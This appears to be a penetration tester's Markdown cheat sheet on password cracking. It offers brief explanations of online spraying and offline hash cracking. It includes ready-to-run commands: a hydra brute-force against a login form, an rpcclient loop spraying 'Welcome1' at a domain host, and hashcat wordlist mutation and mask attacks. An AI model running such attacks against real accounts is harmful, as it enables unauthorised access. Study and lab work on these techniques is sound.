# Cracking
Password cracking involves various techniques and tools to recover or crack passwords from hashed or encrypted formats.
It has two main branches, 1) Online cracking passwords/Spray. 2) Offline cracking hashes.

* Online Password Cracking: Online password cracking involves attempting to crack passwords in real-time by directly interacting with the target system. While this approach is less common and not always effective, tools like Hydra can be used to automate online password guessing. Hydra is a versatile tool that supports a range of protocols, such as SSH, FTP, HTTP, and more, enabling automated login attempts using a provided wordlist or dictionary.

* Offline Password Hash Cracking: Offline password cracking refers to the process of cracking password hashes obtained from a target system without actively interacting with the system itself. Tools like Hashcat and John the Ripper are commonly used for offline cracking. Hashcat, leveraging the power of GPUs, is known for its speed and supports various hash types and attack modes, including dictionary attacks, brute-force attacks, and rule-based attacks. John the Ripper, another popular tool, can handle diverse password hash formats and offers flexible attack modes.

## Creating wordlists
![Pasted image 20230509090220](https://github.com/dbissell6/Shadow_Stone/assets/50979196/54c6eb3e-a0bd-4e30-ae44-2473c2703348)


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/e19d3ea8-7a76-4678-83dc-0e8bba6f894f)

```
hashcat --force password.list -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mut_password.list
```
## Online
Last route, hard to crack, easy to get blocked.

### hydra login webpage
```
hydra -l admin -P rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
### hydra ftp/ssh
![Pasted image 20230509090612](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0be7b78a-b10d-4edf-b1cb-5b28402c216b)

### crackmapexec

<img width="681" alt="Screen Shot 2022-08-06 at 10 16 27 AM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/7ec8a6d2-1cb5-41da-860e-03ccd188f8f0">

![Pasted image 20220805223125](https://github.com/dbissell6/Shadow_Stone/assets/50979196/07107201-2407-44ba-8e22-95d1f5a0f9ca)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/665cab1d-ed45-478b-8caa-9c8ef85f0ba6)


### rpcclient to password spray
![Pasted image 20230508093804](https://github.com/dbissell6/Shadow_Stone/assets/50979196/404d14eb-881b-48d0-8fec-7fc0147330fb)

```
for u in $(cat usernames.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
### kerbrute to spray

![Pasted image 20230508093946](https://github.com/dbissell6/Shadow_Stone/assets/50979196/37b9f071-4e6e-4e66-953d-bd116c0f04ca)


## Offline
Remember, if trying to crack a hash of something from a windows system, even if the cracking fails you might still be able to Pass The Hash.

### hashcat example hashes

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/41352270-138e-4883-9a67-6c67197c3b95)


### hashcat bruteforce length 8 digits+uppercase

```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### zip password
![Pasted image 20220805161528](https://github.com/dbissell6/Shadow_Stone/assets/50979196/eeed6c7b-2722-4d0c-aa1b-82c38390554a)

![Pasted image 20220805161535](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b48c3d5b-1cdc-41df-9346-302b54ba2d71)

### pfx
![Pasted image 20220805161711](https://github.com/dbissell6/Shadow_Stone/assets/50979196/30eb6a80-1283-430e-a0ad-723acc91a2d4)

### TGS ticket

![Pasted image 20230503093443](https://github.com/dbissell6/Shadow_Stone/assets/50979196/e734a700-997d-4ce9-abe2-a9622c1c6988)

![Pasted image 20230503093654](https://github.com/dbissell6/Shadow_Stone/assets/50979196/6d0336e0-2db4-4de3-bc22-20e7b46e5df2)

### AS-REPRoastable hashes
![Pasted image 20230503112725](https://github.com/dbissell6/Shadow_Stone/assets/50979196/28d33815-bf5f-4b74-841b-7e51389c715a)

